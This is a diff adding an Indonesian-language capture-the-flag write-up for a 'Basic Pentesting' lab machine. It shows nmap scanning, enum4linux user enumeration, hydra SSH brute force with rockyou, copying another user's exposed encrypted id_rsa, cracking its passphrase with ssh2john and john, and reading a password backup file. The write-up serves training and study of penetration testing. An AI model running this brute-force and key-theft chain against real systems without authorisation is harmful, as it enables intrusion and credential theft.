@@ -1,0 +1,192 @@
+# Basic Pentesing Write Up
+
+## Tools
+
+1. nmap
+2. enum4linux
+3. hydra
+4. ssh2john
+5. john
+
+## Walk through
+
+### nmap
+
+```bash
+nmap -sV 'IpServer'
+```
+
+#### hasil
+
+```bash
+Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-29 16:07 WIB
+Nmap scan report for 10.10.124.27 (10.10.124.27)
+Host is up (0.31s latency).
+Not shown: 994 closed tcp ports (conn-refused)
+PORT     STATE SERVICE     VERSION
+22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
+80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
+139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
+8080/tcp open  http        Apache Tomcat 9.0.7
+Service Info: Host: BASIC2; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 65.64 seconds
+```
+
+kita mendapatkan beberapa open port dalam server tersebut dan terdapat smb port terbuka, marikita enumerate
+
+### enum4linux
+
+```bash
+enum4linux -a 'IpServer'
+```
+
+#### hasil
+
+```bash
+[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
+
+S-1-22-1-1000 Unix User\kay (Local User)
+S-1-22-1-1001 Unix User\jan (Local User)
+
+```
+
+kita mendapatkan option username yang mana kita pakai untuk login ke ssh.Mari kita gunakan kedua username tersebut untuk memaksa masuk menggunakan metode `Bruteforce`.
+
+### hydra
+
+```bash
+hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://IpServer
+```
+
+#### hasil
+
+```bash
+[22][ssh] host: 10.10.124.27   login: jan   password: armando
+1 of 1 target successfully completed, 1 valid password found
+```
+
+kita mendapatkan password dari username jan, mari kita akses ssh dari server tersebut menggunakan username `jan` dan password `armando`
+
+### ssh
+
+```bash
+ssh jan@IpServer -p 22
+```
+
+setelah kita masuk kedalam ssh dari server tersebut kita gali informasi didalamnya.
+
+```bash
+$ cat /etc/passwd
+
+kay:x:1000:1000:Kay,,,:/home/kay:/bin/bash
+jan:x:1001:1001::/home/jan:/bin/bash
+```
+
+kita mendapatkan 2 user yang sama.Mari kita test cek directory home
+
+```bash
+$ ls -la ..
+
+drwxr-xr-x  4 root root 4096 Apr 19  2018 .
+drwxr-xr-x 24 root root 4096 Apr 23  2018 ..
+drwxr-xr-x  2 root root 4096 Apr 23  2018 jan
+drwxr-xr-x  5 kay  kay  4096 Apr 23  2018 kay
+
+```
+
+kita mendapat directory bernama kay yang mana memiliki akses root, mari kita coba akses.
+
+```bash
+$ cd ../kay && ls -la
+
+drwxr-xr-x 5 kay  kay  4096 Apr 23  2018 .
+drwxr-xr-x 4 root root 4096 Apr 19  2018 ..
+-rw------- 1 kay  kay   756 Apr 23  2018 .bash_history
+-rw-r--r-- 1 kay  kay   220 Apr 17  2018 .bash_logout
+-rw-r--r-- 1 kay  kay  3771 Apr 17  2018 .bashrc
+drwx------ 2 kay  kay  4096 Apr 17  2018 .cache
+-rw------- 1 root kay   119 Apr 23  2018 .lesshst
+drwxrwxr-x 2 kay  kay  4096 Apr 23  2018 .nano
+-rw------- 1 kay  kay    57 Apr 23  2018 pass.bak
+-rw-r--r-- 1 kay  kay   655 Apr 17  2018 .profile
+drwxr-xr-x 2 kay  kay  4096 Apr 23  2018 .ssh
+-rw-r--r-- 1 kay  kay     0 Apr 17  2018 .sudo_as_admin_successful
+-rw------- 1 root kay   538 Apr 23  2018 .viminfo
+```
+
+kita melihat bahwa ada directory `.ssh` didalam,mari coba kita akses dan buka semua file didalam.
+
+```bash
+$ ls -la
+
+-rw-rw-r-- 1 kay kay  771 Apr 23  2018 authorized_keys
+-rw-r--r-- 1 kay kay 3326 Apr 19  2018 id_rsa
+-rw-r--r-- 1 kay kay  771 Apr 19  2018 id_rsa.pub
+
+$ cat id_rsa
+
+-----BEGIN RSA PRIVATE KEY-----
+Proc-Type: 4,ENCRYPTED
+DEK-Info: AES-128-CBC,6ABA7DE35CDB65070B92C1F760E2FE75
+
+IoNb/J0q2Pd56EZ23oAaJxLvhuSZ1crRr4ONGUAnKcRxg3+9vn6xcujpzUDuUtlZ.........
+```
+
+setelah kita sedikit explore kita mendapatkan ssh key , mari kita copy string ini dan simpan untuk kita coba akses ssh servernya dengan nama `kay_ssh_key`.
+
+```bash
+$ chmod 600 kay_ssh_key
+$ ssh -i kay_ssh_key kay@IpServer
+
+Enter passphrase for key 'kay_ssh_id':
+```
+
+ternyata ada password dalam ssh key tersebut, kita coba bruteforce password tersebut.
+
+```bash
+$ ssh2john kay_ssh_id > sshkeyshash.txt
+$ john --wordlist=/usr/share/wordlists/rockyou.txt sshkeyshash.txt
+
+Press 'q' or Ctrl-C to abort, almost any other key for status
+beeswax          (kay_ssh_id)
+```
+
+kita mendapatkan password dari username kay yaitu `beeswax`. Mari kita coba akses kembali.
+
+```bash
+$ ssh -i kay_ssh_key kay@IpServer
+
+Enter passphrase for key 'kay_ssh_id': beeswax
+```
+
+dan kita mendapatkan akses dari user kay dan explore didalamnya.
+
+```bash
+$ ls -la
+
+drwxr-xr-x 5 kay  kay  4096 Apr 23  2018 .
+drwxr-xr-x 4 root root 4096 Apr 19  2018 ..
+-rw------- 1 kay  kay   782 Oct 29 06:41 .bash_history
+-rw-r--r-- 1 kay  kay   220 Apr 17  2018 .bash_logout
+-rw-r--r-- 1 kay  kay  3771 Apr 17  2018 .bashrc
+drwx------ 2 kay  kay  4096 Apr 17  2018 .cache
+-rw------- 1 root kay   119 Apr 23  2018 .lesshst
+drwxrwxr-x 2 kay  kay  4096 Apr 23  2018 .nano
+-rw------- 1 kay  kay    57 Apr 23  2018 pass.bak
+-rw-r--r-- 1 kay  kay   655 Apr 17  2018 .profile
+drwxr-xr-x 2 kay  kay  4096 Apr 23  2018 .ssh
+-rw-r--r-- 1 kay  kay     0 Apr 17  2018 .sudo_as_admin_successful
+-rw------- 1 root kay   538 Apr 23  2018 .viminfo
+
+$ cat pass.bak
+
+heresareallystrongpasswordthatfollowsthepasswordpolicy$$
+```
+
+kita mendapatkan password yang disembunyikan si pembuat server
+
+`heresareallystrongpasswordthatfollowsthepasswordpolicy$$`
